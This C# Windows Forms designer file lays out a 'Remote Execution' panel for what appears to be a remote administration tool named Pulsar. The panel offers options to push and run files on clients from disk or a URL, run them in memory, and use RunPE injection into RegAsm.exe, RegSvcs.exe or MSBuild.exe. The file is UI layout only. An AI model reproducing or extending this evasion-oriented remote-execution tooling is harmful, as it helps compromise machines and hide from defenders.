namespace Pulsar.Server.Forms
{
    partial class FrmRemoteExecution
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmRemoteExecution));
            btnExecute = new System.Windows.Forms.Button();
            txtURL = new System.Windows.Forms.TextBox();
            lblURL = new System.Windows.Forms.Label();
            groupLocalFile = new System.Windows.Forms.GroupBox();
            btnBrowse = new System.Windows.Forms.Button();
            txtPath = new System.Windows.Forms.TextBox();
            label1 = new System.Windows.Forms.Label();
            chkUpdate = new System.Windows.Forms.CheckBox();
            groupURL = new System.Windows.Forms.GroupBox();
            radioLocalFile = new System.Windows.Forms.RadioButton();
            radioURL = new System.Windows.Forms.RadioButton();
            lstTransfers = new Controls.AeroListView();
            hClient = new System.Windows.Forms.ColumnHeader();
            hStatus = new System.Windows.Forms.ColumnHeader();
            chkBoxReflectionExecute = new System.Windows.Forms.CheckBox();
            chkRunPE = new System.Windows.Forms.CheckBox();
            cmbRunPETarget = new System.Windows.Forms.ComboBox();
            lblRunPETarget = new System.Windows.Forms.Label();
            txtRunPECustomPath = new System.Windows.Forms.TextBox();
            btnBrowseRunPE = new System.Windows.Forms.Button();
            groupLocalFile.SuspendLayout();
            groupURL.SuspendLayout();
            SuspendLayout();
            // 
            // btnExecute
            // 
            btnExecute.Location = new System.Drawing.Point(353, 486);
            btnExecute.Name = "btnExecute";
            btnExecute.Size = new System.Drawing.Size(138, 33);
            btnExecute.TabIndex = 6;
            btnExecute.Text = "Execute Remotely";
            btnExecute.UseVisualStyleBackColor = true;
            btnExecute.Click += btnExecute_Click;
            // 
            // txtURL
            // 
            txtURL.Location = new System.Drawing.Point(59, 25);
            txtURL.Name = "txtURL";
            txtURL.Size = new System.Drawing.Size(320, 22);
            txtURL.TabIndex = 1;
            // 
            // lblURL
            // 
            lblURL.AutoSize = true;
            lblURL.Location = new System.Drawing.Point(20, 28);
            lblURL.Name = "lblURL";
            lblURL.Size = new System.Drawing.Size(30, 13);
            lblURL.TabIndex = 0;
            lblURL.Text = "URL:";
            // 
            // groupLocalFile
            // 
            groupLocalFile.Controls.Add(btnBrowse);
            groupLocalFile.Controls.Add(txtPath);
            groupLocalFile.Controls.Add(label1);
            groupLocalFile.Controls.Add(chkUpdate);
            groupLocalFile.Location = new System.Drawing.Point(12, 65);
            groupLocalFile.Name = "groupLocalFile";
            groupLocalFile.Size = new System.Drawing.Size(479, 75);
            groupLocalFile.TabIndex = 1;
            groupLocalFile.TabStop = false;
            // 
            // btnBrowse
            // 
            btnBrowse.Location = new System.Drawing.Point(382, 23);
            btnBrowse.Name = "btnBrowse";
            btnBrowse.Size = new System.Drawing.Size(75, 23);
            btnBrowse.TabIndex = 2;
            btnBrowse.Text = "Browse...";
            btnBrowse.UseVisualStyleBackColor = true;
            btnBrowse.Click += btnBrowse_Click;
            // 
            // txtPath
            // 
            txtPath.Location = new System.Drawing.Point(59, 24);
            txtPath.Name = "txtPath";
            txtPath.ReadOnly = true;
            txtPath.Size = new System.Drawing.Size(317, 22);
            txtPath.TabIndex = 1;
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.Location = new System.Drawing.Point(20, 27);
            label1.Name = "label1";
            label1.Size = new System.Drawing.Size(33, 13);
            label1.TabIndex = 0;
            label1.Text = "Path:";
            // 
            // chkUpdate
            // 
            chkUpdate.AutoSize = true;
            chkUpdate.Location = new System.Drawing.Point(59, 52);
            chkUpdate.Name = "chkUpdate";
            chkUpdate.Size = new System.Drawing.Size(167, 17);
            chkUpdate.TabIndex = 5;
            chkUpdate.Text = "Update clients with this file";
            chkUpdate.UseVisualStyleBackColor = true;
            chkUpdate.CheckedChanged += chkUpdate_CheckedChanged;
            // 
            // groupURL
            // 
            groupURL.Controls.Add(txtURL);
            groupURL.Controls.Add(lblURL);
            groupURL.Enabled = false;
            groupURL.Location = new System.Drawing.Point(12, 169);
            groupURL.Name = "groupURL";
            groupURL.Size = new System.Drawing.Size(479, 75);
            groupURL.TabIndex = 3;
            groupURL.TabStop = false;
            // 
            // radioLocalFile
            // 
            radioLocalFile.AutoSize = true;
            radioLocalFile.Checked = true;
            radioLocalFile.Location = new System.Drawing.Point(12, 12);
            radioLocalFile.Name = "radioLocalFile";
            radioLocalFile.Size = new System.Drawing.Size(110, 17);
            radioLocalFile.TabIndex = 0;
            radioLocalFile.TabStop = true;
            radioLocalFile.Text = "Execute local file";
            radioLocalFile.UseVisualStyleBackColor = true;
            radioLocalFile.CheckedChanged += radioLocalFile_CheckedChanged;
            // 
            // radioURL
            // 
            radioURL.AutoSize = true;
            radioURL.Location = new System.Drawing.Point(12, 146);
            radioURL.Name = "radioURL";
            radioURL.Size = new System.Drawing.Size(114, 17);
            radioURL.TabIndex = 2;
            radioURL.Text = "Execute from URL";
            radioURL.UseVisualStyleBackColor = true;
            radioURL.CheckedChanged += radioURL_CheckedChanged;
            // 
            // lstTransfers
            // 
            lstTransfers.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            lstTransfers.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] { hClient, hStatus });
            lstTransfers.FullRowSelect = true;
            lstTransfers.Location = new System.Drawing.Point(12, 250);
            lstTransfers.Name = "lstTransfers";
            lstTransfers.Size = new System.Drawing.Size(479, 230);
            lstTransfers.TabIndex = 4;
            lstTransfers.UseCompatibleStateImageBehavior = false;
            lstTransfers.View = System.Windows.Forms.View.Details;
            // 
            // hClient
            // 
            hClient.Text = "Client";
            hClient.Width = 302;
            // 
            // hStatus
            // 
            hStatus.Text = "Status";
            hStatus.Width = 173;
            // 
            // chkBoxReflectionExecute
            // 
            chkBoxReflectionExecute.Location = new System.Drawing.Point(128, 12);
            chkBoxReflectionExecute.Name = "chkBoxReflectionExecute";
            chkBoxReflectionExecute.Size = new System.Drawing.Size(177, 19);
            chkBoxReflectionExecute.TabIndex = 7;
            chkBoxReflectionExecute.Text = "Memory Execution (.NET only)";
            chkBoxReflectionExecute.UseVisualStyleBackColor = true;
            chkBoxReflectionExecute.CheckedChanged += chkBoxReflectionExecute_CheckedChanged;
            // 
            // chkRunPE
            // 
            chkRunPE.AutoSize = true;
            chkRunPE.Location = new System.Drawing.Point(311, 14);
            chkRunPE.Name = "chkRunPE";
            chkRunPE.Size = new System.Drawing.Size(59, 17);
            chkRunPE.TabIndex = 8;
            chkRunPE.Text = "RunPE";
            chkRunPE.UseVisualStyleBackColor = true;
            chkRunPE.CheckedChanged += chkRunPE_CheckedChanged;
            // 
            // cmbRunPETarget
            // 
            cmbRunPETarget.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            cmbRunPETarget.Enabled = false;
            cmbRunPETarget.FormattingEnabled = true;
            cmbRunPETarget.Items.AddRange(new object[] { "RegAsm.exe", "RegSvcs.exe", "MSBuild.exe", "Custom Path" });
            cmbRunPETarget.Location = new System.Drawing.Point(376, 11);
            cmbRunPETarget.Name = "cmbRunPETarget";
            cmbRunPETarget.Size = new System.Drawing.Size(115, 21);
            cmbRunPETarget.TabIndex = 9;
            cmbRunPETarget.SelectedIndexChanged += cmbRunPETarget_SelectedIndexChanged;
            // 
            // lblRunPETarget
            // 
            lblRunPETarget.AutoSize = true;
            lblRunPETarget.Enabled = false;
            lblRunPETarget.Location = new System.Drawing.Point(376, 14);
            lblRunPETarget.Name = "lblRunPETarget";
            lblRunPETarget.Size = new System.Drawing.Size(0, 13);
            lblRunPETarget.TabIndex = 10;
            // 
            // txtRunPECustomPath
            // 
            txtRunPECustomPath.Enabled = false;
            txtRunPECustomPath.Location = new System.Drawing.Point(12, 37);
            txtRunPECustomPath.Name = "txtRunPECustomPath";
            txtRunPECustomPath.Size = new System.Drawing.Size(396, 22);
            txtRunPECustomPath.TabIndex = 11;
            txtRunPECustomPath.Visible = false;
            // 
            // btnBrowseRunPE
            // 
            btnBrowseRunPE.Enabled = false;
            btnBrowseRunPE.Location = new System.Drawing.Point(414, 36);
            btnBrowseRunPE.Name = "btnBrowseRunPE";
            btnBrowseRunPE.Size = new System.Drawing.Size(77, 23);
            btnBrowseRunPE.TabIndex = 12;
            btnBrowseRunPE.Text = "Browse...";
            btnBrowseRunPE.UseVisualStyleBackColor = true;
            btnBrowseRunPE.Visible = false;
            btnBrowseRunPE.Click += btnBrowseRunPE_Click;
            // 
            // FrmRemoteExecution
            // 
            AcceptButton = btnExecute;
            AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            ClientSize = new System.Drawing.Size(503, 521);
            Controls.Add(btnBrowseRunPE);
            Controls.Add(txtRunPECustomPath);
            Controls.Add(lblRunPETarget);
            Controls.Add(cmbRunPETarget);
            Controls.Add(chkRunPE);
            Controls.Add(chkBoxReflectionExecute);
            Controls.Add(lstTransfers);
            Controls.Add(radioURL);
            Controls.Add(radioLocalFile);
            Controls.Add(groupURL);
            Controls.Add(groupLocalFile);
            Controls.Add(btnExecute);
            Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            Name = "FrmRemoteExecution";
            StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "Update []";
            FormClosing += FrmRemoteExecution_FormClosing;
            Load += FrmRemoteExecution_Load;
            groupLocalFile.ResumeLayout(false);
            groupLocalFile.PerformLayout();
            groupURL.ResumeLayout(false);
            groupURL.PerformLayout();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private System.Windows.Forms.Button btnExecute;
        private System.Windows.Forms.TextBox txtURL;
        private System.Windows.Forms.Label lblURL;
        private System.Windows.Forms.GroupBox groupLocalFile;
        private System.Windows.Forms.TextBox txtPath;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.GroupBox groupURL;
        private System.Windows.Forms.RadioButton radioLocalFile;
        private System.Windows.Forms.RadioButton radioURL;
        private System.Windows.Forms.Button btnBrowse;
        private Controls.AeroListView lstTransfers;
        private System.Windows.Forms.ColumnHeader hClient;
        private System.Windows.Forms.ColumnHeader hStatus;
        public System.Windows.Forms.CheckBox chkUpdate;
        private System.Windows.Forms.CheckBox chkBoxReflectionExecute;
        private System.Windows.Forms.CheckBox chkRunPE;
        private System.Windows.Forms.ComboBox cmbRunPETarget;
        private System.Windows.Forms.Label lblRunPETarget;
        private System.Windows.Forms.TextBox txtRunPECustomPath;
        private System.Windows.Forms.Button btnBrowseRunPE;
    }
}